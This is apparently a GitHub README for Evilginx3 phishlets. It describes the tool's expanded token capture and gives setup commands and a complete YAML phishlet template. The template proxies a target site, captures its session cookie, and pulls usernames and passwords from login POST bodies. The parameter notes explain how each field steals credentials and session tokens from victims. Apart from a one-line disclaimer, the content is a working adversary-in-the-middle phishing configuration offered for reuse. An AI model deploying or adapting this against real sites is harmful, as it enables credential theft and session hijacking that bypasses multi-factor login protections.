This repository is dedicated to updated versions of Evilginx phishlets, in tune with the latest Evilginx3. 

## Key Updates and Features


Experience enhanced TLS certificate management and automated retrieval of LetsEncrypt TLS certificates thanks to the efficient certmagic library. We've extended session token extraction, which can now be obtained from HTTP headers and response bodies, not just cookies. 

Phishing pages can now be beautifully displayed within iframes, greatly enhancing user interactivity. Configurations have become straightforward with the transition to JSON format from YAML. Moreover, you can now create specialized child phishlets from templates, making it easier to target websites with customized hostnames.

With the upgrades to Evilginx 3.0 and 3.2 - Various feature improvements have been provided. Notably, token capture has been extended from cookies to HTTP headers and the response body (which is pretty insane). This has opened up new possibilities for phishing pages - allowing to be embedded within iframes.

## Using Evilginx3 Phishlets

Follow this guide to simulate a phishing attack scenario utilizing a custom phishlet for Rencora:

- Make sure the Evilginx3 is correctly set up on your machine
- `~/.evilginx/phishlets/` directory
- initiate the Evilginx3 framework
- `phishlets load rencora`
- `phishlets enable rencora`
- `lures create rencora`

## Phishlet Configuration Template

```yaml
name: 'Rencora Security'
author: 'Rencora'
min_ver: '3.2.0'

params:
  - name: 'domain'
    required: true
    description: 'Root domain to phish'

proxy_hosts:
  - { phish_sub: 'www', orig_sub: 'www', domain: '{domain}', session: true, is_landing: true }

sub_filters: 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}

auth_tokens:
  - domain: '{domain}'
    keys: ['session']

creds:
  - key: 'username'
    search: ['(.*)']
    type: 'post'
  - key: 'password'
    search: ['(.*)']
    type: 'post'

auth_urls:
  - url_regex: 'https://{hostname}/login'
    valid_statuses: [200]

login:
  username: user
  password: pass
  url: https://www.{domain}/login

# This is a demo example of a phishlet for 3.0 for my company Rencora

```
**Explanation of Phishlet Parameters:**

- `min_ver:` Specifies the minimum Evilginx version that is compatible with your phishlet.
- `proxy_hosts:` Indicates the domain and subdomains to proxy. The `phish_sub` is the subdomain that the phishing page will imitate.
- `sub_filters:` Allows the phishlet to replace instances of the actual domain name with the phishing domain, which is critical for the phishing page to function correctly.
- `auth_tokens:` Identifies the cookies that should be captured from the victim's browser to gain access to the victim's session.
- `params:` You list the required parameters that will be used in the phishlet. These include the `name`, whether it is `required` and a `description` of what the parameter is used for.
- `creds:` This field determines the credentials that the phishlet is engineered to steal. The `key` is the name of the credential (like username or password) and `search` is a regular expression that the program will use to identify and extract these details from the user's input.
- `auth_urls:` Defines the URLs that Evilginx will treat as the authenticated URLs. After the victim logs in, Evilginx will look out for a redirect to one of these URLs, at which point it will steal the listed `auth_tokens`.
- `login:` Here you specify the identifiers of the username and password fields in the login form on the original webpage. The `url` is the link of the page where the victim enters their credentials.
- `force_post:` If set to true, it forces the alteration of HTTP method from GET to POST.
- `is_landing:` If set to true, it means that the page is a landing page for the phishing attack.
- `js_inject:` This is where you can write some JavaScript to be injected in the webpage. It's typically used to enhance the phishing attack and ensure a smoother victim experience.
- `domain:` This is a template variable used to replace target hostname used in phishlet configuration.

##

Learn More: 

For more in-depth knowledge about using Evilginx, consider exploring the courses by **BreakDev** and **SimplerHacking**. They offer a much more thorough understanding of Evilginx and modern Man-in-the-Middle attacks. 

- [**BreakDev Evilginx Mastery Course**](https://www.breakdev.org)
- [**SimplerHacking Evil Phishing Pro Course**](https://www.simplerhacking.com)

  ##

  _**Disclaimer: This content is strictly for academic and ethical purposes. Unauthorized, illegal, or unethical usage is not endorsed. The author is not responsible for any misuse or damage.**_

